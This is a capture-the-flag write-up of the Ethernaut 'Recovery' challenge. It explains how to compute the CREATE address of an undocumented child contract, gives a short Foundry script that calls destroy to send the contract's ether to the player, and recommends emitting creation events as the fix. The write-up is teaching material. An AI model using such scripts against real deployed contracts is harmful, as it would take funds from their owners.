# Recovery — Security Writeup

| | |
|---|---|
| **Challenge** | [Ethernaut 18 — Recovery](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-recovery) |
| **Platform** | Smart Contracts Hacking (SCH) / OpenZeppelin Ethernaut |
| **Target** | `src/Recovery.sol` |
| **Solidity** | `^0.8.0` |
| **Severity** | Medium (operational / address discovery) |
| **Status** | Exploited — local PoC passing |

---

## Executive summary

`Recovery` deploys a `SimpleToken` that holds ETH but does not save or emit the new contract’s address. The token owner is the `generateToken` caller and may `selfdestruct` to a chosen recipient. To recover funds you must **derive the CREATE address** of the first child contract (nonce `1` on the `Recovery` deployer), then call `destroy`.

---

## Challenge objectives

| # | Condition | How verified |
|---|-----------|--------------|
| 1 | Ether leaves the token to the player | `destroy` + balance / code checks |

---

## Finding

### [M-01] Undocumented contract address (CREATE)

| Field | Detail |
|-------|--------|
| **Severity** | Medium (design / observability) |
| **Bug class** | Missing event / registry for `new` deployments |
| **Location** | `Recovery.generateToken` |

On-chain, contract creation is visible in transaction receipts, but the Recovery contract itself offers no getter. The standard fix for integrators is `emit TokenCreated(token)` or a `mapping` — for the CTF, use CREATE address math.

#### Proof of concept

```bash
cd web3-ctf-challenges/18-ethernaut-recovery
forge test --match-test testExploit -vv
```

---

## Exploit implementation

### SCH (`Exploit.s.sol`)

SCH forbids `vm.computeCreateAddress` and nested `interface` can break their harness. Use OZ-style `uint8` RLP packing + low-level `destroy`:

```solidity
function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    address token = address(
        uint160(uint256(keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), recoveryInstance, uint8(0x01)))))
    );
    (bool ok,) = token.call(abi.encodeWithSignature("destroy(address)", PLAYER_ADDRESS));
    require(ok, "destroy failed");

    vm.stopBroadcast();
}
```

Instance name: `recoveryInstance`. Nonce `1` = first child of a fresh contract account.

---

## Remediation

Emit creation events, store `address` in state, or use a factory with an on-chain registry. For user-facing flows, never rely on clients guessing CREATE addresses.

---

## References

- [Ethernaut Recovery (OZ)](https://ethernaut.openzeppelin.com/)
- [Contract address derivation (CREATE)](https://ethereum.org/en/developers/docs/smart-contracts/deploying/#contract-addresses)
